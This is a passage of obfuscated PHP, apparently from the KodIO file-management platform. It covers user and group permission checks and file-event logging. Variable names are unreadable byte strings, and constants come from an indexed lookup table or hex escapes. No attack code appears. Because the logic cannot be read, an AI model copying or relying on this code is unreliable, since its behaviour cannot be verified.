array($­§û¥™‚[178] => SourceModel::TYPE_GROUP, $­§û¥™‚[538] => array($­§û¥™‚[460], $¶×™Øğ‹)), $­§û¥™‚[1044] => $­§û¥™‚[1985]); } $ˆ¦ŞçÙÑ = $this->field($­§û¥™‚[2087])->where($­Ì“ÂÂÙ)->select(); $ŞÌ’ÒúÔ = array(); $ƒóÇ×àŠ = array_to_keyvalue_group($ˆ¦ŞçÙÑ, $­§û¥™‚[181]); foreach ($ƒóÇ×àŠ as $ÆÂşêş° => $°ÉŸÇ) { $´¥…–½ = $this->authArrayCheck($°ÉŸÇ, $ àÂß¬Ä); if ($´¥…–½[$­§û¥™‚[456]] > 0) { $ŞÌ’ÒúÔ[] = $ÆÂşêş° . $­§û¥™‚[12]; } } if ($¶×™Øğ‹) { $Ÿ©¨½æ¶ = Model($­§û¥™‚[554]); foreach ($¶×™Øğ‹ as $û¨ª”ã©) { $ “ş¸Õ = $Ÿ©¨½æ¶->getInfo($û¨ª”ã©); if (!$ “ş¸Õ || !is_array($ “ş¸Õ[$­§û¥™‚[87]])) { continue; } $ŞÌ’ÒúÔ[] = $ “ş¸Õ[$­§û¥™‚[87]][$­§û¥™‚[181]]; } } $´§¥œ¡µ = array(); $Äœæ÷³Š = $¶×™Øğ‹; $úŠÁÁ™ä = Model($­§û¥™‚[1376]); $Ÿ©¨½æ¶ = Model($­§û¥™‚[554]); $»Ÿõàâ = array(); $Ÿœïò¿ = array(); $¾õ£—¸ç = array(); $®äï•ı÷ = array(); if ($ŞÌ’ÒúÔ) { $’ŸœŞ„’ = $úŠÁÁ™ä->where(array($­§û¥™‚[181] => array($­§û¥™‚[460], $ŞÌ’ÒúÔ)))->select(); foreach ($’ŸœŞ„’ as $ï¿Ñ£®ë) { $ÉÉåûï› = $úŠÁÁ™ä->parentLevelArray($ï¿Ñ£®ë[$­§û¥™‚[553]]); $´§¥œ¡µ = array_merge($´§¥œ¡µ, $ÉÉåûï›); $Äœæ÷³Š[] = $ï¿Ñ£®ë[$­§û¥™‚[538]]; $»Ÿõàâ[$ï¿Ñ£®ë[$­§û¥™‚[181]]] = $ÉÉåûï›; $Ÿœïò¿[$ï¿Ñ£®ë[$­§û¥™‚[181]]] = $ï¿Ñ£®ë[$­§û¥™‚[538]]; } } $Äœæ÷³Š = array_values(array_unique($Äœæ÷³Š)); $éŠÜ…ï = $Äœæ÷³Š; foreach ($éŠÜ…ï as $û¨ª”ã©) { $ “ş¸Õ = $Ÿ©¨½æ¶->getInfo($û¨ª”ã©); $ÉÉåûï› = $úŠÁÁ™ä->parentLevelArray($ “ş¸Õ[$­§û¥™‚[553]]); $Äœæ÷³Š = array_merge($Äœæ÷³Š, $ÉÉåûï›); } $Äœæ÷³Š = array_values(array_unique($Äœæ÷³Š)); foreach ($Äœæ÷³Š as $û¨ª”ã©) { $ “ş¸Õ = $Ÿ©¨½æ¶->getInfo($û¨ª”ã©); $´§¥œ¡µ[] = $ “ş¸Õ[$­§û¥™‚[87]][$­§û¥™‚[181]]; $¾õ£—¸ç[$û¨ª”ã©] = $ “ş¸Õ[$­§û¥™‚[87]][$­§û¥™‚[181]]; $®äï•ı÷[$û¨ª”ã©] = $úŠÁÁ™ä->parentLevelArray($ “ş¸Õ[$­§û¥™‚[553]]); } foreach ($»Ÿõàâ as $§Â¡©Ïû => $‚œ§ö³„) { $­…˜•†â = $Ÿœïò¿[$§Â¡©Ïû]; if (!$­…˜•†â || !$¾õ£—¸ç[$­…˜•†â]) { continue; } $¹ª¿ÉãÚ = array(); foreach ($®äï•ı÷[$­…˜•†â] as $û¨ª”ã©) { $¹ª¿ÉãÚ[] = $¾õ£—¸ç[$û¨ª”ã©]; } $»Ÿõàâ[$§Â¡©Ïû] = array_merge($¹ª¿ÉãÚ, $‚œ§ö³„); } $´§¥œ¡µ = array_values(array_unique($´§¥œ¡µ)); $éº·ÕêÑ = array($­§û¥™‚[2079] => $´§¥œ¡µ, $­§û¥™‚[2080] => $»Ÿõàâ); $ñÖò­Â[$ àÂß¬Ä] = $éº·ÕêÑ; return $éº·ÕêÑ; } private function makeSourceAuth($Öò³í¼¯, $³ßû­Å, $­¦ö—ÏÅ = false) { $õ“¯ö‘ï =& $_SERVER[—ÌÒğš÷]; $€²çáù¹ = $õ“¯ö‘ï[88]; $ï£­˜ä” = $Öò³í¼¯[$õ“¯ö‘ï[538]]; $…“˜‡šè = $Öò³í¼¯[$õ“¯ö‘ï[178]] == SourceModel::TYPE_GROUP; $¿ÎŠÈæÑ = $…“˜‡šè ? $this->groupRootAuth($ï£­˜ä”, $­¦ö—ÏÅ) : !1; if ($¿ÎŠÈæÑ && Model($õ“¯ö‘ï[540])->authCheckAction($¿ÎŠÈæÑ[$õ“¯ö‘ï[455]], $õ“¯ö‘ï[1908])) { return $this->groupAuthInfo($¿ÎŠÈæÑ, $ï£­˜ä”); } $±¸»Í¯İ = Model($õ“¯ö‘ï[1376])->parentLevelArray($Öò³í¼¯[$õ“¯ö‘ï[553]]); $±¸»Í¯İ = array_merge(array($Öò³í¼¯[$õ“¯ö‘ï[181]]), array_reverse($±¸»Í¯İ)); $€³ ‡ã = !1; foreach ($±¸»Í¯İ as $Š¨Ü‡³) { if (!isset($³ßû­Å[$Š¨Ü‡³])) { continue; } $‰ğÒ±‹Á = $this->authMake($³ßû­Å[$Š¨Ü‡³], $­¦ö—ÏÅ); if ($‰ğÒ±‹Á[$õ“¯ö‘ï[508]]) { $€³ ‡ã = $‰ğÒ±‹Á; break; } } if (!$…“˜‡šè) { return $€³ ‡ã; } if (!$€³ ‡ã && $¿ÎŠÈæÑ) { $€³ ‡ã = $this->groupAuthInfo($¿ÎŠÈæÑ, $ï£­˜ä”); } if (!$€³ ‡ã) { $ëƒêé’ô = Model($õ“¯ö‘ï[554])->getInfo($ï£­˜ä”); $ÍÊ°…ÊÀ = explode($õ“¯ö‘ï[50], trim($ëƒêé’ô[$õ“¯ö‘ï[553]], $õ“¯ö‘ï[50])); $ÍÊ°…ÊÀ = array_reverse($ÍÊ°…ÊÀ); foreach ($ÍÊ°…ÊÀ as $ŸµŒÌ) { if ($ŸµŒÌ == $õ“¯ö‘ï[212] || $ŸµŒÌ == $€²çáù¹) { continue; } $§ÖĞÚ‰İ = $this->groupRootAuth($ŸµŒÌ, $­¦ö—ÏÅ); if (!$§ÖĞÚ‰İ) { continue; } $€³ ‡ã = $this->groupAuthInfo($§ÖĞÚ‰İ, $ŸµŒÌ); break; } } if (!$€³ ‡ã || $€³ ‡ã[$õ“¯ö‘ï[456]] <= 0) { $¨±Üáå¶ = $this->authDeepCheck($Öò³í¼¯[$õ“¯ö‘ï[181]], $­¦ö—ÏÅ); if ($¨±Üáå¶) { $€³ ‡ã = $¨±Üáå¶; } } return $€³ ‡ã; } private function userIsRoot($¾ååÂ§ = false) { $ê œÓîÀ =& $_SERVER[—ÌÒğš÷]; if (!$¾ååÂ§ && _get($GLOBALS, $ê œÓîÀ[536])) { return !0; } $êüººô = Model($ê œÓîÀ[567])->getInfo($¾ååÂ§); $±«±¿Œ´ = Model($ê œÓîÀ[2088])->listData($êüººô[$ê œÓîÀ[1563]]); if ($±«±¿Œ´ && $±«±¿Œ´[$ê œÓîÀ[544]][$ê œÓîÀ[2089]] == 1) { return !0; } return !1; } private function sourceAuthInfo($şí×µš) { $¸Âªîãê =& $_SERVER[—ÌÒğš÷]; $…»éôæ = Model($¸Âªîãê[1376]); $Ş„Ó¿©à = $…»éôæ->sourceInfo($şí×µš); if (!$Ş„Ó¿©à) { return !1; } $…»éôæ->groupPathDisplay($Ş„Ó¿©à); $Æî·Æ‰ = array($Ş„Ó¿©à); $Æî·Æ‰ = $…»éôæ->_listAppendPath($Æî·Æ‰); $Ş„Ó¿©à = $Æî·Æ‰[0]; $“Ä¤Ó£À = $Ş„Ó¿©à[$¸Âªîãê[551]]; if (isset($Ş„Ó¿©à[$¸Âªîãê[559]])) { $ÇÒ¯ÓÈï = explode($¸Âªîãê[8], trim($Ş„Ó¿©à[$¸Âªîãê[551]], $¸Âªîãê[8])); array_shift($ÇÒ¯ÓÈï); $“Ä¤Ó£À = $Ş„Ó¿©à[$¸Âªîãê[557]] . $¸Âªîãê[2090] . implode($¸Âªîãê[8], $ÇÒ¯ÓÈï); } return array($¸Âªîãê[462] => $Ş„Ó¿©à[$¸Âªîãê[32]], $¸Âªîãê[84] => KodIO::make($Ş„Ó¿©à[$¸Âªîãê[181]]), $¸Âªîãê[2091] => $“Ä¤Ó£À); } private function groupAuthInfo($µË¡›ç§, $«Éõœğ) { $Äº»ÙÇ© =& $_SERVER[—ÌÒğš÷]; $“¥Ï‰¦ó = Model($Äº»ÙÇ©[554])->getInfo($«Éõœğ); return array($Äº»ÙÇ©[2092] => intval($µË¡›ç§[$Äº»ÙÇ©[455]]), $Äº»ÙÇ©[2076] => $µË¡›ç§, $Äº»ÙÇ©[2093] => LNG($Äº»ÙÇ©[2094]), $Äº»ÙÇ©[2085] => array($Äº»ÙÇ©[462] => $“¥Ï‰¦ó[$Äº»ÙÇ©[32]], $Äº»ÙÇ©[84] => KodIO::make($“¥Ï‰¦ó[$Äº»ÙÇ©[87]][$Äº»ÙÇ©[181]]), $Äº»ÙÇ©[2091] => $“¥Ï‰¦ó[$Äº»ÙÇ©[558]])); } protected function groupRootAuth($±…½Òˆ°, $¨ú…ñ® = false) { $Ø¿Ïûœ =& $_SERVER[—ÌÒğš÷]; $¨ú…ñ® = $¨ú…ñ® ? $¨ú…ñ® : USER_ID; $ö‚²¶Í = $¨ú…ñ® . $Ø¿Ïûœ[2095] . $±…½Òˆ°; static $…œ½„½± = array(); if (isset($…œ½„½±[$ö‚²¶Í])) { return $…œ½„½±[$ö‚²¶Í]; } $Î°„„€ó = Model($Ø¿Ïûœ[554])->getInfo($±…½Òˆ°); $Ş³ËÃ¥§ = $this->userGroupList($¨ú…ñ®); $Â—§›²¨ = isset($Ş³ËÃ¥§[$±…½Òˆ°]) ? $Ş³ËÃ¥§[$±…½Òˆ°][$Ø¿Ïûœ[455]] : !1; if ($Â—§›²¨ && Model($Ø¿Ïûœ[540])->authCheckAction($Â—§›²¨[$Ø¿Ïûœ[455]], $Ø¿Ïûœ[1908])) { $…œ½„½±[$ö‚²¶Í] = $Â—§›²¨; return $Â—§›²¨; } $¸ ¥‚éÄ = $this->sourceAuthSelect($Î°„„€ó[$Ø¿Ïûœ[87]][$Ø¿Ïûœ[181]]); $Õ€ÒÌ®¯ = $¸ ¥‚éÄ ? $this->authMake($¸ ¥‚éÄ, $¨ú…ñ®) : !1; $Õâ™¦ãå = $Õ€ÒÌ®¯ ? $Õ€ÒÌ®¯[$Ø¿Ïûœ[508]] : !1; $…œ½„½±[$ö‚²¶Í] = $Õâ™¦ãå ? $Õâ™¦ãå : $Â—§›²¨; return $…œ½„½±[$ö‚²¶Í]; } public function authOwnerApply($ˆ³Ö’Ô) { $ğ×»Š‰ =& $_SERVER[—ÌÒğš÷]; if (empty($ˆ³Ö’Ô[$ğ×»Š‰[455]]) || isset($ˆ³Ö’Ô[$ğ×»Š‰[2096]]) && $ˆ³Ö’Ô[$ğ×»Š‰[2096]]) { return $ˆ³Ö’Ô; } if (AuthModel::authCheckRoot($ˆ³Ö’Ô[$ğ×»Š‰[455]][$ğ×»Š‰[456]])) { return $ˆ³Ö’Ô; } $öÖóİÖê = Model($ğ×»Š‰[1376])->parentLevelArray($ˆ³Ö’Ô[$ğ×»Š‰[553]]); $öÖóİÖê = array_merge(array($ˆ³Ö’Ô[$ğ×»Š‰[181]]), array_reverse($öÖóİÖê)); $”¼ÂóÄ„ = $this->sourceAuthSelect($öÖóİÖê); $ó¯í¿‹ = array(); $ÍĞËÊô = array(); foreach ($”¼ÂóÄ„ as $Û©™èŞ => $ÚÊå‡§‹) { $º¿Ğ‹¦ = $this->authFolderOwnerUser($ÚÊå‡§‹); $ó¯í¿‹[$Û©™èŞ] = $º¿Ğ‹¦; $ÍĞËÊô = array_merge($ÍĞËÊô, $º¿Ğ‹¦[$ğ×»Š‰[630]]); if ($º¿Ğ‹¦[$ğ×»Š‰[2097]]) { break; } } if (count($ÍĞËÊô) == 0) { $ÍĞËÊô = $this->authFolderOwnerGroup($ˆ³Ö’Ô[$ğ×»Š‰[538]]); } $ÍĞËÊô = array_unique($ÍĞËÊô); if (AuthModel::authCheckRoot($ˆ³Ö’Ô[$ğ×»Š‰[455]][$ğ×»Š‰[456]])) { $ÍĞËÊô[] = USER_ID; } $ˆ³Ö’Ô[$ğ×»Š‰[455]][$ğ×»Š‰[2098]] = Model($ğ×»Š‰[546])->userListInfo($ÍĞËÊô); return $ˆ³Ö’Ô; } private function authFolderOwnerGroup($Ñõ¸ñÆ”) { $ûª”ß†‡ =& $_SERVER[—ÌÒğš÷]; $¢µçŸ³ä = Model($ûª”ß†‡[1977])->where(array($ûª”ß†‡[1887] => $Ñõ¸ñÆ”))->select(); $ñÔœ÷€’ = array(); if (!$¢µçŸ³ä) { return $ñÔœ÷€’; } foreach ($¢µçŸ³ä as $Û´³¤¡ı) { $¥œªä¹í = $this->authInfo($Û´³¤¡ı); if (AuthModel::authCheckRoot($¥œªä¹í[$ûª”ß†‡[455]])) { $ñÔœ÷€’[] = $Û´³¤¡ı[$ûª”ß†‡[1688]]; } } return $ñÔœ÷€’; } private function authFolderOwnerUser($¬©§ÎÍ) { $–À‚ˆÇë =& $_SERVER[—ÌÒğš÷]; $¥á¤§©ó = array(); $ªáí†…î = !1; foreach ($¬©§ÎÍ as $£‰ûí¿·) { $ã½æÙÕ¸ = $this->authInfo($£‰ûí¿·); if ($£‰ûí¿·[$–À‚ˆÇë[538]] == $–À‚ˆÇë[212]) { $ªáí†…î = !0; } if ($£‰ûí¿·[$–À‚ˆÇë[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ã½æÙÕ¸[$–À‚ˆÇë[455]])) { $¥á¤§©ó[] = $£‰ûí¿·[$–À‚ˆÇë[538]]; } } } return array($–À‚ˆÇë[630] => $¥á¤§©ó, $–À‚ˆÇë[2097] => $ªáí†…î); } public function authMake($½ÖüëùŒ, $½Ÿ×É¯™ = false) { $»—®İÆÜ =& $_SERVER[—ÌÒğš÷]; $Å³†ÜÂğ = $this->authArrayCheck($½ÖüëùŒ, $½Ÿ×É¯™); if ($Å³†ÜÂğ[$»—®İÆÜ[2099]]) { $Å³†ÜÂğ[$»—®İÆÜ[2099]] = $this->sourceAuthInfo($Å³†ÜÂğ[$»—®İÆÜ[2099]]); } return $Å³†ÜÂğ; } public function authArrayCheck($³—ä‹»™, $ŠÃ£ˆäº = false) { $éôå¯–¸ =& $_SERVER[—ÌÒğš÷]; if (!$³—ä‹»™) { return array($éôå¯–¸[456] => 0, $éôå¯–¸[508] => !1); } $ŠÃ£ˆäº = $ŠÃ£ˆäº ? $ŠÃ£ˆäº : USER_ID; $é­ùåˆ = 0; $ë›°´»Ş = 0; $üßµã˜ê = 0; $±õüĞËÍ = 0; $ğ¸ê±Š² = 0; $Œò¤ƒ¾Ğ = 0; $¢£Ñ†•ä = 1000; $­ÆÉ·şá = 0; $¥èÄŠóù = 0; $æáÌ¦ôĞ = 0; $ƒŞ°‚Ÿû = 0; $èç‚û‚¹ = array($éôå¯–¸[181] => 0); foreach ($³—ä‹»™ as $èç‚û‚¹) { $ÁŞü¢°³ = $this->authInfo($èç‚û‚¹); if (!$ÁŞü¢°³) { continue; } $À Ÿƒ© = $èç‚û‚¹[$éôå¯–¸[538]]; $Ì´İ£ŞØ = intval($ÁŞü¢°³[$éôå¯–¸[455]]); if ($èç‚û‚¹[$éôå¯–¸[178]] == SourceModel::TYPE_USER && $À Ÿƒ© == $ŠÃ£ˆäº) { $é­ùåˆ = !0; $üßµã˜ê = $ÁŞü¢°³; $ë›°´»Ş = $Ì´İ£ŞØ; } else { if ($èç‚û‚¹[$éôå¯–¸[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($À Ÿƒ©, $ŠÃ£ˆäº)) { $±õüĞËÍ = !0; $È¬Ó× = $this->groupStepToUserGroup($À Ÿƒ©, $ŠÃ£ˆäº); if ($È¬Ó× < $¢£Ñ†•ä) { $¢£Ñ†•ä = $È¬Ó×; $ğ¸ê±Š² = $Ì´İ£ŞØ; $Œò¤ƒ¾Ğ = $ÁŞü¢°³; $­ÆÉ·şá = $À Ÿƒ©; } if ($È¬Ó× == $¢£Ñ†•ä && $Ì´İ£ŞØ >= $ğ¸ê±Š²) { $ğ¸ê±Š² = $Ì´İ£ŞØ; $Œò¤ƒ¾Ğ = $ÁŞü¢°³; $­ÆÉ·şá = $À Ÿƒ©; } } else { if ($À Ÿƒ© == $éôå¯–¸[212]) { $¥èÄŠóù = !0; $ƒŞ°‚Ÿû = $ÁŞü¢°³; $æáÌ¦ôĞ = $Ì´İ£ŞØ; } } } } if ($é­ùåˆ) { $·€‡÷Äñ = $ë›°´»Ş; $ÁŞü¢°³ = $üßµã˜ê; $ÅœùÛ³Ä = LNG($éôå¯–¸[2100]); } else { if ($±õüĞËÍ) { $·€‡÷Äñ = $ğ¸ê±Š²; $ÁŞü¢°³ = $Œò¤ƒ¾Ğ; $³ª–½‰ = Model($éôå¯–¸[554])->getInfo($­ÆÉ·şá); $ÅœùÛ³Ä = $éôå¯–¸[163] . $³ª–½‰[$éôå¯–¸[558]] . $éôå¯–¸[2101] . LNG($éôå¯–¸[2102]); } else { if ($¥èÄŠóù) { $·€‡÷Äñ = $æáÌ¦ôĞ; $ÁŞü¢°³ = $ƒŞ°‚Ÿû; $ÅœùÛ³Ä = LNG($éôå¯–¸[2073]); } else { $·€‡÷Äñ = 0; $ÁŞü¢°³ = !1; $ÅœùÛ³Ä = $éôå¯–¸[12]; } } } $«·Š¾¹Ê = array($éôå¯–¸[2092] => intval($·€‡÷Äñ), $éôå¯–¸[2076] => $ÁŞü¢°³, $éôå¯–¸[2093] => $ÅœùÛ³Ä, $éôå¯–¸[2085] => $èç‚û‚¹[$éôå¯–¸[181]]); return $«·Š¾¹Ê; } private function groupContainUser($½Ÿ€ı§, $Ö¼£ Û = false) { return in_array($½Ÿ€ı§, $this->userGroupParents($Ö¼£ Û)); } private function groupStepToUserGroup($Ê—×‡µî, $“±æ’ñ = false) { $ÊõÑÓ‰¥ =& $_SERVER[—ÌÒğš÷]; $Ù€‘êÙú = $this->userGroupList($“±æ’ñ); $©¹Ë°© = 1000; $àİ³¸å† = $GLOBALS[$ÊõÑÓ‰¥[6]][$ÊõÑÓ‰¥[89]][$ÊõÑÓ‰¥[1990]] == 1; $Í»–İ…Ô = $àİ³¸å† ? 3 : 2; foreach ($Ù€‘êÙú as $îºš¦…) { if ($îºš¦…[$ÊõÑÓ‰¥[1887]] == $Ê—×‡µî) { return 0; } $å×‹¦² = explode($ÊõÑÓ‰¥[50], trim($îºš¦…[$ÊõÑÓ‰¥[553]], $ÊõÑÓ‰¥[50])); if ($å×‹¦²[0] == $ÊõÑÓ‰¥[212] && count($å×‹¦²) > $Í»–İ…Ô) { $”¤îüŸğ = array_reverse(array_slice($å×‹¦², $Í»–İ…Ô)); $¹¶“Á–× = array_search($Ê—×‡µî, $”¤îüŸğ); if ($¹¶“Á–× !== !1 && $¹¶“Á–× + 1 <= $©¹Ë°©) { $©¹Ë°© = $¹¶“Á–× + 1; } } } return $©¹Ë°©; } private function userGroupList($ù×¹¹ã‹ = false) { $ÔğÛ…ø =& $_SERVER[—ÌÒğš÷]; static $Ñ†•­Ğ = array(); if (isset($Ñ†•­Ğ[$ù×¹¹ã‹])) { return $Ñ†•­Ğ[$ù×¹¹ã‹]; } $È“÷ºÎÈ = Model($ÔğÛ…ø[567])->getInfo($ù×¹¹ã‹); $Ñ†•­Ğ[$ù×¹¹ã‹] = array_to_keyvalue($È“÷ºÎÈ[$ÔğÛ…ø[2074]], $ÔğÛ…ø[1887]); return $Ñ†•­Ğ[$ù×¹¹ã‹]; } public function userGroupParents($—ŒÁª¦) { $ß’Ûª”¢ =& $_SERVER[—ÌÒğš÷]; static $¸şÒşß› = array(); $—ŒÁª¦ = $—ŒÁª¦ ? $—ŒÁª¦ : USER_ID; if (isset($¸şÒşß›[$—ŒÁª¦])) { return $¸şÒşß›[$—ŒÁª¦]; } $íèâßÓ = $this->userGroupList($—ŒÁª¦); $´ãÖ‚èÃ = array(); $Êö¡Ûòö = $GLOBALS[$ß’Ûª”¢[6]][$ß’Ûª”¢[89]][$ß’Ûª”¢[1990]] == 1; $î²Ô¥¡Ó = $Êö¡Ûòö ? 3 : 2; foreach ($íèâßÓ as $ØÆŠÅú) { $Í…Â½¼û = array($ØÆŠÅú[$ß’Ûª”¢[1887]]); $ÜÇöê™£ = explode($ß’Ûª”¢[50], trim($ØÆŠÅú[$ß’Ûª”¢[553]], $ß’Ûª”¢[50])); if ($ÜÇöê™£[0] == $ß’Ûª”¢[212] && count($ÜÇöê™£) > $î²Ô¥¡Ó) { $ÛˆĞñ¯ö = array_slice($ÜÇöê™£, $î²Ô¥¡Ó); $Í…Â½¼û = array_merge($Í…Â½¼û, array_reverse($ÛˆĞñ¯ö)); } $´ãÖ‚èÃ = array_merge($´ãÖ‚èÃ, $Í…Â½¼û); } $¸şÒşß›[$—ŒÁª¦] = array_unique($´ãÖ‚èÃ); return $¸şÒşß›[$—ŒÁª¦]; } public function authTargetInfoMake($ú¶ï´Ä) { $Í‡ÛÃ‘ =& $_SERVER[—ÌÒğš÷]; $¿Ñï£…ä = array(); $‡Êš÷é = array(); foreach ($ú¶ï´Ä as $Ãöî•Û) { if ($Ãöî•Û[$Í‡ÛÃ‘[178]] == SourceModel::TYPE_USER) { $¿Ñï£…ä[] = intval($Ãöî•Û[$Í‡ÛÃ‘[538]]); } else { if ($Ãöî•Û[$Í‡ÛÃ‘[178]] == SourceModel::TYPE_GROUP) { $‡Êš÷é[] = intval($Ãöî•Û[$Í‡ÛÃ‘[538]]); } } } if ($¿Ñï£…ä) { $¿Ñï£…ä = Model($Í‡ÛÃ‘[546])->userListInfo($¿Ñï£…ä); } if ($‡Êš÷é) { $³ìú ìè = array($Í‡ÛÃ‘[1975] => array($Í‡ÛÃ‘[460], $‡Êš÷é)); $‡Êš÷é = Model($Í‡ÛÃ‘[554])->field($Í‡ÛÃ‘[2103])->where($³ìú ìè)->select(); $‡Êš÷é = array_to_keyvalue($‡Êš÷é, $Í‡ÛÃ‘[1887]); } return array($Í‡ÛÃ‘[2104] => $¿Ñï£…ä, $Í‡ÛÃ‘[2105] => $‡Êš÷é); } public function authInfo($”ßûêê´) { $­š§¬Ê“ =& $_SERVER[—ÌÒğš÷]; if ($”ßûêê´[$­š§¬Ê“[1991]]) { $Ä®ÖûÛß = Model($­š§¬Ê“[540])->listData($”ßûêê´[$­š§¬Ê“[1991]]); if (!$Ä®ÖûÛß) { return !1; $ú¹ŠóÎ® = Model($­š§¬Ê“[540])->listData(); $ù“üƒ = array_filter_by_field($ú¹ŠóÎ®, $­š§¬Ê“[455], $­š§¬Ê“[212]); return $ù“üƒ; } $’í­§Û = array_field_key($Ä®ÖûÛß, array($­š§¬Ê“[443], $­š§¬Ê“[32], $­š§¬Ê“[455], $­š§¬Ê“[1910], $­š§¬Ê“[1911])); $’í­§Û[$­š§¬Ê“[2106]] = $”ßûêê´; return $’í­§Û; } else { return array($­š§¬Ê“[461] => 0, $­š§¬Ê“[1893] => $”ßûêê´[$­š§¬Ê“[2051]], $­š§¬Ê“[462] => $­š§¬Ê“[12], $­š§¬Ê“[1910] => $­š§¬Ê“[2107]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\x65\x5f\145\166\x65\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\x6e\163\x65\x72\164", "\x66\x75\156\x63\164\x69\157\x6e"), array("\x64\145\163\143", '', "\151\x6e\x73\x65\x72\x74\54\165\160\144\x61\x74\x65\x2c\x73\x65\154\145\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ë™±Éä„, $–Äò’åÙ, $óÖİÓÌ‡ = '') { $…Ğúâàå =& $_SERVER[—ÌÒğš÷]; if (!$this->eventSave) { return; } $ãéá„²Á = Model($…Ğúâàå[1376])->sourceInfo($ë™±Éä„); if (!$ãéá„²Á) { return !1; } if ($this->isCacheEvent($ãéá„²Á, $–Äò’åÙ)) { return; } if ($óÖİÓÌ‡ && is_string($óÖİÓÌ‡)) { $óÖİÓÌ‡ = array($…Ğúâàå[1926] => $óÖİÓÌ‡); } $«“æÍ¼ = defined($…Ğúâàå[2108]) ? USER_ID : 0; $Ë¥½¸ÄÎ = array($…Ğúâàå[459] => $ë™±Éä„, $…Ğúâàå[2109] => $ãéá„²Á[$…Ğúâàå[180]], $…Ğúâàå[2110] => $ãéá„²Á[$…Ğúâàå[32]], $…Ğúâàå[551] => !empty($ãéá„²Á[$…Ğúâàå[551]]) ? $ãéá„²Á[$…Ğúâàå[551]] : $…Ğúâàå[12], $…Ğúâàå[1679] => $«“æÍ¼, $…Ğúâàå[464] => $–Äò’åÙ, $…Ğúâàå[1681] => $óÖİÓÌ‡); $this->addSystemLog($–Äò’åÙ, $Ë¥½¸ÄÎ); unset($Ë¥½¸ÄÎ[$…Ğúâàå[2110]], $Ë¥½¸ÄÎ[$…Ğúâàå[551]]); return $this->add($Ë¥½¸ÄÎ); } private function addSystemLog($ÛÒ—š‚¼, $æú×•¾) { $ì¿Û­ã =& $_SERVER[—ÌÒğš÷]; if ($ÛÒ—š‚¼ == $ì¿Û­ã[2111]) { $ÛÒ—š‚¼ = $æú×•¾[$ì¿Û­ã[494]][$ì¿Û­ã[2112]]; } else { if (in_array($ÛÒ—š‚¼, array($ì¿Û­ã[1867], $ì¿Û­ã[2113]))) { $ÛÒ—š‚¼ = $æú×•¾[$ì¿Û­ã[494]][$ì¿Û­ã[790]]; } } $»‹£Í’Ä = array_merge($æú×•¾, array($ì¿Û­ã[2114] => $æú×•¾[$ì¿Û­ã[181]], $ì¿Û­ã[2115] => $æú×•¾[$ì¿Û­ã[2115]])); Hook::trigger($ì¿Û­ã[2116], $ì¿Û­ã[2117] . $ÛÒ—š‚¼, $æú×•¾); Model($ì¿Û­ã[1831])->addLog($ì¿Û­ã[2117] . $ÛÒ—š‚¼, $»‹£Í’Ä); } private function isCacheEvent($ÁÜ’úåã, $ÓÚÌ®ŠÉ) { if ($ÁÜ’úåã[$_SERVER[—ÌÒğš÷][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ìøÏˆ¶Ø, $÷è±üÕ¶) { $‡¥ºÇà =& $_SERVER[—ÌÒğš÷]; $–êÑÂâç = Model($‡¥ºÇà[1376])->sourceInfo($ìøÏˆ¶Ø); $éü¶°ıÂ = array($‡¥ºÇà[2112] => $÷è±üÕ¶, $‡¥ºÇà[32] => $–êÑÂâç[$‡¥ºÇà[32]]); return $this->addEvent($ìøÏˆ¶Ø, $‡¥ºÇà[2111], $éü¶°ıÂ); } public function eventFileEdit($ü¼ÍÔâ) { $§òâğ¸ =& $_SERVER[—ÌÒğš÷]; $ÊØÓÖÏ = array($§òâğ¸[2118] => $_SERVER[$§òâğ¸[2119]], $§òâğ¸[2120] => strtolower(ACTION)); if (isset($GLOBALS[$§òâğ¸[7]][$§òâğ¸[2121]])) { $ÊØÓÖÏ[$§òâğ¸[2121]] = $§òâğ¸[88]; } return $this->addEvent($ü¼ÍÔâ, $§òâğ¸[1857], $ÊØÓÖÏ); } public function eventRecycle($íìí·Ë¯, $¶ŞÈĞ¦š) { return $this->addEvent($íìí·Ë¯, $_SERVER[—ÌÒğš÷][2113], $¶ŞÈĞ¦š); } public function eventRemove($•ú¿Ú¯¼) { $íÕ³¼şØ =& $_SERVER[—ÌÒğš÷]; $•æÌ¨ = Model($íÕ³¼şØ[1376])->sourceInfo($•ú¿Ú¯¼); $ÛìÎ²¡÷ = $•æÌ¨[$íÕ³¼şØ[32]]; return $this->addEvent($•æÌ¨[$íÕ³¼şØ[180]], $íÕ³¼şØ[1856], $ÛìÎ²¡÷); } public function eventShare($ªĞ‰Ü®£, $ÉÔ´ı³ù) { return $this->addEvent($ªĞ‰Ü®£, $_SERVER[—ÌÒğš÷][1867], $ÉÔ´ı³ù); } public function eventMove($Ï›ØæüÀ, $ÙŸğ²´¢, $í¯¨£¼) { $Ë§±ûáÒ =& $_SERVER[—ÌÒğš÷]; $¤¢şÅ‰ş = Model($Ë§±ûáÒ[1376]); $©ï¿ü´÷ = $¤¢şÅ‰ş->sourceInfo($Ï›ØæüÀ); $àüï¥ÆË = $¤¢şÅ‰ş->sourceInfo($ÙŸğ²´¢); $©¯ø” = $¤¢şÅ‰ş->sourceInfo($í¯¨£¼); $™Ëö¾èÍ = array($Ë§±ûáÒ[1204] => $ÙŸğ²´¢, $Ë§±ûáÒ[2122] => $àüï¥ÆË[$Ë§±ûáÒ[32]], $Ë§±ûáÒ[2099] => !empty($àüï¥ÆË[$Ë§±ûáÒ[551]]) ? $àüï¥ÆË[$Ë§±ûáÒ[551]] : $Ë§±ûáÒ[12], $Ë§±ûáÒ[1205] => $í¯¨£¼, $Ë§±ûáÒ[2123] => $©¯ø”[$Ë§±ûáÒ[32]], $Ë§±ûáÒ[2124] => !empty($©¯ø”[$Ë§±ûáÒ[551]]) ? $©¯ø”[$Ë§±ûáÒ[551]] : $Ë§±ûáÒ[12]); $this->addEvent($Ï›ØæüÀ, $Ë§±ûáÒ[588], $™Ëö¾èÍ); $©ï¿ü´÷ = $¤¢şÅ‰ş->sourceInfo($Ï›ØæüÀ); $™Ëö¾èÍ = 